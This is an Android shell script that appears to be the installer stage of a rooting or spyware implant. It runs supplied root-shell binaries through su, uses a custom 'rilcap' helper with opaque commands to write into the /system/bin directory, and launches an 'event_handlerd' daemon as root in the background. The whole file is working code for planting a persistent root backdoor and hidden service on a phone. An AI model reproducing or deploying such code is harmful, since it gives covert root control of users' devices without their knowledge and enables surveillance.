#!/system/bin/sh

# argv[1]: absolute new shell path
# argv[2]: absolute old shell path

export PATH=$PATH:/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin

# Check if SELinux is present
getprop=$(su -c "getprop ro.build.selinux")
getenforce=$(su -c "getenforce")
found=0
installed=0

if [ -z "$getprop" ]; then
    getprop=0
fi

if [ -z "$getenforce" ]; then
    getenforce="unset"
fi

if [ "$getprop" -eq 1 ] || [ "$getenforce" = "Enforcing" ] || [ "$getenforce" = "Permissive" ]; then
    found=1
fi


# If SELinux doesn't exists
if [ "$found" != 1 ]; then
 
    # Try to install the old shell and try to create a file in /system/bin
    chmod 755 $2
    cmd=$(su -c "$2 rt")
    rilcap blw
    cmd=$(rilcap qzx "cat /system/bin/ls > /system/bin/testsuidext")
    success=$(ls /system/bin/testsuidext)

    # If we were able to create the file, we won
    if [ "$success" = "/system/bin/testsuidext" ]; then
	installed=1
	cmd=$(rilcap qzx "rm /system/bin/testsuidext")
	rilcap blr
    fi
fi

# Check if the old shell succeded
if [ "$installed" != 1 ]; then
    # Use the new shell
    chmod 755 $1
    $(su -c "$1 rt") &
    sleep 2
    # Start the service
    $(su -c "/system/bin/event_handlerd --daemon") &
    sleep 2
fi

